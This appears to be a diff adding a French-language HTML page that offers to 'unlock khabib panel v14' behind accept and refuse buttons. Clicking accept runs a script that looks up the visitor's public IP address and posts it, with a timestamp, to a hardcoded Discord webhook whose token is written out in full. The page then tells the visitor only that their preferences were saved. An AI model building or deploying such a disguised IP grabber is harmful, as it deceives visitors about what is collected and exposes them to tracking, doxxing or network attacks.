@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>etes vous sur de vouloir débloquer khabib panel v12 </title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #0f172a;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .box {
+            background: #020617;
+            padding: 25px;
+            border-radius: 10px;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(0,0,0,0.6);
+        }
+
+        button {
+            margin: 10px;
+            padding: 10px 18px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 15px;
+        }
+
+        .accept {
+            background: #22c55e;
+            color: black;
+        }
+
+        .refuse {
+            background: #ef4444;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+
+<div class="box" id="consentBox">
+    <h2>khabib</h2>
+    <p>
+        voulez vous debloquer khabib panel v14?.
+    </p>
+    <button class="accept" onclick="accept()">J’accepte</button>
+    <button class="refuse" onclick="refuse()">Je refuse</button>
+</div>
+
+<div class="box" id="resultBox" style="display:none;">
+    <h2>Merci</h2>
+    <p id="resultText"></p>
+</div>
+
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1453050534851379243/QQWpYZbMCPh4wn637YIkWNvpPLw7BxVyo6kJWN2q1xxn4IXiEnL6LGU-wDVhGbMiUaEU";
+
+function accept() {
+    document.getElementById("consentBox").style.display = "none";
+    document.getElementById("resultBox").style.display = "block";
+    document.getElementById("resultText").textContent = "Traitement en cours...";
+
+    fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+            const payload = {
+                content: `📥 **Nouveau visiteur avec consentement**\n🌐 IP : ${data.ip}\n🕒 ${new Date().toLocaleString()}`
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+
+            document.getElementById("resultText").textContent =
+                "Merci. Vos préférences ont été enregistrées.";
+        })
+        .catch(() => {
+            document.getElementById("resultText").textContent =
+                "Erreur lors de la récupération de l’IP.";
+        });
+}
+
+function refuse() {
+    document.getElementById("consentBox").style.display = "none";
+    document.getElementById("resultBox").style.display = "block";
+    document.getElementById("resultText").textContent =
+        "Vous avez refusé. Aucune donnée n’a été envoyée.";
+}
+</script>
+
+</body>
+</html>
